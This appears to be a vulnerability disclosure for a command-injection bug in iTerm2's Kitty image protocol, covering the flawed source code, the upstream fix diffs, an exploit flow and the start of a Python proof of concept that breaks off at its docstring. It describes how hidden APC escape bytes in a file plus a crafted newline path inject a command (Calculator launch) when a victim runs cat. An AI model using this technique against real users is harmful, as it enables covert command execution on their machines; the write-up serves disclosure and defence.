iTerm2’s Kitty image protocol implementation has an arbitrary command execution vulnerability in the file transmit error response path. An APC escape sequence embedded in any file is consumed by the VT100 parser and does not appear in the `cat` output itself, but the Kitty file transmit error response preserves literal newlines from a crafted file path and writes them to PTY stdin — the shell interprets these newlines as command separators, resulting in arbitrary command execution.

This is a **logic bug** — no memory corruption or race condition required — and is 100% reproducible. It works on a default iTerm2 installation with no configuration changes, and **triggers on all shells including bash, zsh, and fish**.

## Affected Versions

| Affected | Fixed | Prerequisite |
| --- | --- | --- |
| 3.6.1 – 3.7.8 | 3.7.9 | iTerm2 installed (default settings) |

## Vulnerability

Three independent issues combine into a single exploit chain: (1) the APC handler lacks the trust check present in OSC handlers, (2) the Kitty file transmit error path preserves literal newlines from `NSError.localizedDescription`, and (3) the response is unconditionally written to PTY stdin.

### APC Processing — No Trust Check

When the VT100 parser receives an APC sequence, it calls `executeAPC:`. At [A], it checks for tmux mode — if active, it returns early. At [B], it checks only whether the string starts with “G”, and at [C] creates a Kitty image command and passes it to the delegate. Compared to OSC sequence handling, the `terminalIsTrusted` check is **completely absent**. Any APC that reaches the VT100 parser is unconditionally executed regardless of source.

```
// sources/VT100/VT100Terminal.m — executeAPC:

- (void)executeAPC:(VT100Token *)token {
    if (_tmuxMode) {                                                // [A]
        [_delegate terminalSetWindowTitle:...];
        return;
    }
    if ([token.string hasPrefix:@"G"]) {                            // [B]
        iTermKittyImageCommand *command =
            [[iTermKittyImageCommand alloc]
                initWithAPCString:[token.string substringFromIndex:1]];
        if (!command) {
            return;
        }
        [_delegate terminalDidReceiveKittyImageCommand:command];    // [C]
    }
}
```

No trust check exists in the delegate chain either. At [A], the command is passed directly to `kittyImageController`.

```
// sources/VT100Screen/VT100ScreenMutableState+TerminalDelegate.m

- (void)terminalDidReceiveKittyImageCommand:(iTermKittyImageCommand *)command {
    [_kittyImageController execute:command];                        // [A]
}
```

### Kitty File Transmit — Error Newline Preservation

When the Kitty image controller receives a `t=f` (file transmit) command, it decodes the base64 payload and uses it as a file path. At [A], `URL.resourceValues()` checks whether the file exists — if it doesn’t, an exception is thrown. At [B], the `filenameIsSafe()` blocklist check exists, but this code is only reachable after `resourceValues()` succeeds, so it **never executes for non-existent files**. At [C], the catch block embeds `error.localizedDescription` directly into the error message. macOS’s `NSError.localizedDescription` preserves **literal newlines (0x0A)** in filenames without escaping them.

```
// sources/InlineImages/KittyImageController.swift — handle(command:fileURL:query:)

private func handle(command: KittyImageCommand.ImageTransmission,
                    fileURL: URL,
                    query: Bool) -> String? {
    do {
        let values = try fileURL.resourceValues(forKeys: [.isRegularFileKey])  // [A]
        guard values.isRegularFile == true else {
            return "EBADF:Not a file"
        }
        guard filenameIsSafe(fileURL: fileURL) else {                           // [B]
            return "EBADF:Invalid path"
        }
        let content = try Data(contentsOf: fileURL)
        return handle(command: command, data: content, query: query)
    } catch {
        return "EBADF:\(error.localizedDescription)"                            // [C]
    }
}
```

### Response Written to PTY Stdin

The response containing the error message is written to PTY stdin. At [A], the default verbosity `.normal` **always** sends the response — it is sent regardless of whether it is an error. At [B], the response is wrapped in APC format (`ESC_G...ESC\`) and passed to the delegate.

```
// sources/InlineImages/KittyImageController.swift — respondToTransmit()

func respondToTransmit(_ imageTransmission: KittyImageCommand.ImageTransmission,
                        display: KittyImageCommand.ImageDisplay?,
                        error: String?) {
    if imageTransmission.more == .expectMore {
        return
    }
    var args = [String]()
    args.append("i=\(imageTransmission.identifier)")
    // ...
    let payload = args.joined(separator: ",") + semi + (error ?? "OK")
    let message = "\u{1B}_G\(payload)\u{1B}\\"

    switch imageTransmission.verbosity {
    case .normal:                                                               // [A]
        delegate?.kittyImageControllerReport(message: message)                  // [B]
    case .query:
        if error != nil {
            delegate?.kittyImageControllerReport(message: message)
        }
        return
    case .quiet:
        return
    }
}
```

At the end of the delegate chain, [A] the response data is written to the PTY via `screenSendReportData:`. This function sends data through the same path as keyboard input, so the shell interprets this data as if the user typed it.

```
// sources/VT100Screen/VT100ScreenMutableState.m — kittyImageControllerReportWithMessage:

- (void)kittyImageControllerReportWithMessage:(NSString *)string {
    [self willSendReport];
    __weak __typeof(self) weakSelf = self;
    const NSStringEncoding encoding = self.terminal.encoding;
    [self addSideEffect:^(id<VT100ScreenDelegate> delegate) {
        [delegate screenSendReportData:                                         // [A]
            [string dataUsingEncoding:encoding]];
        [weakSelf didSendReport:delegate];
    } name:@"kitty image report"];
}
```

### Bypassed Security Controls

| Security control | Status | Reason |
| --- | --- | --- |
| `filenameIsSafe()` | Bypassed | Located after `resourceValues()` throw — unreachable for non-existent files |
| `terminalIsTrusted` | Absent | No trust check in `executeAPC:` (unlike OSC) |
| `disablePotentiallyInsecureEscapeSequences` | Not applicable | Does not cover APC sequences |
| Default verbosity | Favors attacker | `.normal` is the default — error response is always sent |

### Patch

The developer confirmed and fixed the vulnerability across two commits. Adding a `terminalIsTrusted` check to the APC handler would **not** have protected default installations — `terminalIsTrusted` is simply the inverse of the advanced setting “Disable potentially insecure escape sequences,” which is **off by default** (the terminal is trusted by default). The response sanitization is what closes the hole for everyone.

The first fix adds `sanitizedResponseMessage(_:)` to `KittyImageController.swift`. It replaces every C0 control character (0x00–0x1F, including ESC, CR, LF) and DEL (0x7F) with a space before the response is framed and sent. The error payload in `respondToTransmit()` and `respondToDisplay()` is passed through this sanitizer.
[a53b1bc](https://github.com/gnachman/iTerm2/commit/a53b1bc084fe062de44b52d03ccf713c7962ac83)

```
diff --git a/sources/InlineImages/KittyImageController.swift b/sources/InlineImages/KittyImageController.swift
--- a/sources/InlineImages/KittyImageController.swift
+++ b/sources/InlineImages/KittyImageController.swift
@@ -987,6 +987,28 @@ class KittyImageController: NSObject {

         return data
     }
+    private static func sanitizedResponseMessage(_ string: String) -> String {
+        var result = ""
+        result.unicodeScalars.reserveCapacity(string.unicodeScalars.count)
+        for scalar in string.unicodeScalars {
+            if scalar.value < 0x20 || scalar.value == 0x7f {
+                result.unicodeScalars.append(" ")
+            } else {
+                result.unicodeScalars.append(scalar)
+            }
+        }
+        return result
+    }
+
     func respondToTransmit(_ imageTransmission: KittyImageCommand.ImageTransmission,
                             display: KittyImageCommand.ImageDisplay?,
                             error: String?) {
@@ -1005,7 +1027,7 @@ class KittyImageController: NSObject {
             args.append("p=\(p)")
         }
         let semi = args.isEmpty ? "" : ";"
-        let payload = args.joined(separator: ",") + semi + (error ?? "OK")
+        let payload = args.joined(separator: ",") + semi + (error.map { Self.sanitizedResponseMessage($0) } ?? "OK")
         let message = "\u{1B}_G\(payload)\u{1B}\\"

         switch imageTransmission.verbosity {
@@ -1241,7 +1263,7 @@ class KittyImageController: NSObject {
         }()
         let pre = "\u{1B}_G"
         let post = "\u{1B}\\"
-        let errorOrOK = error ?? "OK"
+        let errorOrOK = error.map { Self.sanitizedResponseMessage($0) } ?? "OK"
         let message =
             if parameters.isEmpty {
                 errorOrOK
```

The follow-up commit extracts a shared sanitizer `stringByReplacingControlCharactersWithSpace` on `NSString`, extending coverage to C1 characters (0x80–0x9F) while preserving Unicode format characters (Cf) such as ZWJ and bidi marks. It replaces the per-file sanitizer and is applied to three report paths: Kitty image, Kitty drag-and-drop (OSC 72), and title reporting.
[2a63835](https://github.com/gnachman/iTerm2/commit/2a63835ca19bbd20b0d051b33c14341b0b708d5b)

```
diff --git a/sources/Categories/NSStringITerm.m b/sources/Categories/NSStringITerm.m
--- a/sources/Categories/NSStringITerm.m
+++ b/sources/Categories/NSStringITerm.m
@@ -1757,6 +1757,42 @@
     }];
 }

++ (NSCharacterSet *)it_reportUnsafeControlCharacterSet {
+    static NSCharacterSet *set;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^{
+        NSMutableCharacterSet *mutableSet = [NSMutableCharacterSet characterSetWithRange:NSMakeRange(0, 0x20)];
+        [mutableSet addCharactersInRange:NSMakeRange(0x7F, 0x21)];
+        set = [mutableSet copy];
+    });
+    return set;
+}
+
+- (NSString *)stringByReplacingControlCharactersWithSpace {
+    const NSUInteger length = self.length;
+    if ([self rangeOfCharacterFromSet:[NSString it_reportUnsafeControlCharacterSet]].location == NSNotFound) {
+        return self;
+    }
+    unichar *buffer = malloc(sizeof(unichar) * length);
+    [self getCharacters:buffer range:NSMakeRange(0, length)];
+    for (NSUInteger i = 0; i < length; i++) {
+        if (iTermIsReportUnsafeControlCharacter(buffer[i])) {
+            buffer[i] = ' ';
+        }
+    }
+    return [[NSString alloc] initWithCharactersNoCopy:buffer length:length freeWhenDone:YES];
+}
```

The Kitty drag-and-drop sanitizer was changed from stripping only CR/LF to stripping all control characters, and the title report sanitizer was hardened the same way.

```
diff --git a/sources/DragAndDrop/KittyDnDMessage.swift b/sources/DragAndDrop/KittyDnDMessage.swift
--- a/sources/DragAndDrop/KittyDnDMessage.swift
+++ b/sources/DragAndDrop/KittyDnDMessage.swift
@@ -62,13 +66,12 @@
         return parts.joined(separator: ":")
     }

     static func sanitize(_ value: String) -> String {
-        guard value.utf8.contains(where: { $0 == 0x0a || $0 == 0x0d }) else {
-            return value
-        }
-        return String(value.unicodeScalars.filter { $0 != "\n" && $0 != "\r" })
+        return (value as NSString).replacingControlCharactersWithSpace()
     }

diff --git a/sources/PTYSession/PTYSession.m b/sources/PTYSession/PTYSession.m
--- a/sources/PTYSession/PTYSession.m
+++ b/sources/PTYSession/PTYSession.m
@@ -19925,7 +19925,13 @@
 - (NSString *)reportSafeTitle:(NSString *)unsafeTitle {
-    NSCharacterSet *unsafeSet = [NSCharacterSet characterSetWithCharactersInString:@"|;\r\n\e"];
+    NSMutableCharacterSet *unsafeSet = [[NSString it_reportUnsafeControlCharacterSet] mutableCopy];
+    [unsafeSet addCharactersInString:@"|;"];
     NSString *result = unsafeTitle;
     NSRange range;
     range = [result rangeOfCharacterFromSet:unsafeSet];
```

## Exploitation

The attack vector is embedding APC escape sequence bytes into a malicious file. When the entire file content is output to the terminal (e.g., via `cat`), the raw bytes are delivered to the terminal and processed by the VT100 parser. **This works on all shells — bash, zsh, fish, etc.** — the shell type is irrelevant.

The APC sequence (starting with `ESC _`, ending with `ESC \`) is consumed by iTerm2’s VT100 parser and is **invisible in the `cat` output** — the file appears to be a normal document. However, when the exploit triggers, the error response injected into PTY stdin produces visible garbled shell errors on the terminal. The injected command executes between these garbled lines, so the command execution itself is visible to the user. Concealment of this output was not explored in this research.

### Injection Detail

The core of the attack relies on two facts: macOS `NSError.localizedDescription` **preserves literal newlines in filenames**, and the error message uses **curly quotes instead of ASCII double-quotes**.

**Why ASCII double-quotes are not used**: If ASCII `"` is included in the file path, it appears as-is in the error message. When delivered to the shell via PTY, bash enters double-quote mode upon encountering `"`, and newlines no longer act as command separators. macOS’s `NSError.localizedDescription` uses Unicode curly quotes (`“`, `”`), which are not special characters in bash and do not trigger quote mode.

The file path set by the attacker (before base64 encoding):

```
/tmp/x\nopen -a Calculator\nz
       ^^^^^^^^^^^^^^^^^^^^
       injected command (between newlines)
```

### Exploit Flow

```
1. Attacker: Build exploit file
   └── Any file (README.md, .txt, .log, etc.) with hidden APC bytes

2. Delivery: Git repository, shared folder, archive, email attachment

3. Victim: cat <file>

4. iTerm2 processing:
   ├── Normal text output (visible)
   ├── APC bytes → VT100 Parser (invisible, consumed)
   │   └── executeAPC:                              ← NO trust check
   │       └── KittyImageController.execute()
   │           └── executeTransmitFile()
   │               └── base64 decode → file path with \n
   │
   ├── handle(command:fileURL:query:)
   │   └── resourceValues() throws                   ← file not found
   │       └── catch: "EBADF:\(error.localizedDescription)"
   │           └── localizedDescription preserves \n ← NEWLINES PRESERVED
   │
   ├── respondToTransmit()
   │   └── verbosity .normal → ALWAYS sends          ← no suppression
   │       └── kittyImageControllerReport()
   │           └── screenSendReportData()             ← WRITES TO PTY STDIN
   │
   └── Shell reads PTY stdin
       └── Line discipline splits on \n:
           Line 1: \x1b_Gi=1;EBADF:The file “/tmp/x  ← garbled (shell error)
           Line 2: open -a Calculator               ← EXECUTED
           Line 3: z” couldn’t be opened...         ← shell error (ignored)

5. Result: Calculator.app launches
```

### Exploit File Structure

APC bytes can be embedded in any file type — `.md`, `.txt`, `.log`, `.csv`, configuration files, source code, etc. The only requirement is that the file content is output to the terminal via `cat`. The following example uses a README.md, but any file that a user might `cat` is a valid vector. The APC itself is invisible in `cat` output (consumed by the VT100 parser), but the error response injected into PTY stdin appears as garbled shell errors alongside the executed command.

```
README.md (243 bytes)
├── # Project Setup Guide
├── ## Prerequisites
│     └── normal markdown text
├── [APC bytes]                    ← invisible in cat output
│     └── \x1b_Ga=T,f=100,t=f,i=1;<payload_base64>\x1b\
├── ## Installation
│     └── normal markdown text
└── ## License
```

## PoC

### Full Exploit

```
#!/usr/bin/env python3
"""
iTerm2 Kitty — cat trigger PoC
====================================
Creates a README.md with an embedded APC escape sequence.
When displayed with cat in iTerm2, the Kitty image
protocol error response injects a command into PTY stdin.

CRITICAL: Command must NOT contain '/' characters.
  '/' is a path separator in URL(fileURLWithPath:), which
  splits the path and changes the error message format,
  breaking the newline injection.
"""